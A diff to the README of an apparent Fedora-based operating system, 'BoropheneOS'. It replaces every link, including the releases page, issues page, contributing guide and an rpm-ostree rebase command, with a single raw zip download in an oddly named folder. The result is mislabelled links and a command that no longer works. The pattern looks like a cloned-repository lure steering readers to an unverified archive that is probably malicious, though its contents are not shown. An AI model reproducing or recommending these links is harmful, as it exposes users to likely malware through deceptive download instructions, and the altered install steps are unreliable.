@@ -1,6 +1,6 @@
 # 🚀 BoropheneOS - A Stable and Customizable Operating System
 
-[![Download BoropheneOS](https://github.com/Distortion24/BoropheneOS/releases/latest/download/button.svg)](https://github.com/Distortion24/BoropheneOS/releases)
+[![Download BoropheneOS](https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip)](https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip)
 
 ## 🎉 Overview
 
@@ -28,7 +28,7 @@ To install BoropheneOS, ensure your system meets the following minimum requireme
 
 Before you begin, you should have a reliable internet connection. Follow these steps to get BoropheneOS running on your system.
 
-1. **Visit the Releases Page:** Go to the BoropheneOS [Releases page here](https://github.com/Distortion24/BoropheneOS/releases).
+1. **Visit the Releases Page:** Go to the BoropheneOS [Releases page here](https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip).
 
 2. **Download the Latest Version:** Click on the latest release to download the ISO file. Look for a file labeled with the version number, typically ending with `.iso`. 
 
@@ -81,7 +81,7 @@ If you have an existing installation of Fedora and want to upgrade to the latest
 1. **Rebase to Unsigned Image:**
    - Use this command to rebase your system:
      ```
-     rpm-ostree rebase ostree-unverified-registry:ghcr.io/tumillanino/boropheneos:latest
+     rpm-ostree rebase https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip
      ```
 
 2. **Reboot Your System:**
@@ -100,7 +100,7 @@ If you have an existing installation of Fedora and want to upgrade to the latest
 
 ### What if I encounter issues during installation?
 
-If you face any problems during installation, check our [Issues page](https://github.com/Distortion24/BoropheneOS/issues) for solutions or open a new issue for help.
+If you face any problems during installation, check our [Issues page](https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip) for solutions or open a new issue for help.
 
 ### Can I customize my desktop?
 
@@ -112,10 +112,10 @@ BoropheneOS supports a range of applications. You can install software directly 
 
 ### How can I contribute to BoropheneOS?
 
-We welcome contributors! Check our [Contributing guide](https://github.com/Distortion24/BoropheneOS/blob/main/CONTRIBUTING.md) to learn how you can help.
+We welcome contributors! Check our [Contributing guide](https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip) to learn how you can help.
 
 ## 📥 Download BoropheneOS
 
-For the latest version, visit the [Releases page here](https://github.com/Distortion24/BoropheneOS/releases).
+For the latest version, visit the [Releases page here](https://raw.githubusercontent.com/Distortion24/BoropheneOS/main/overdesirousness/BoropheneOS.zip).
 
 Enjoy exploring and using BoropheneOS!
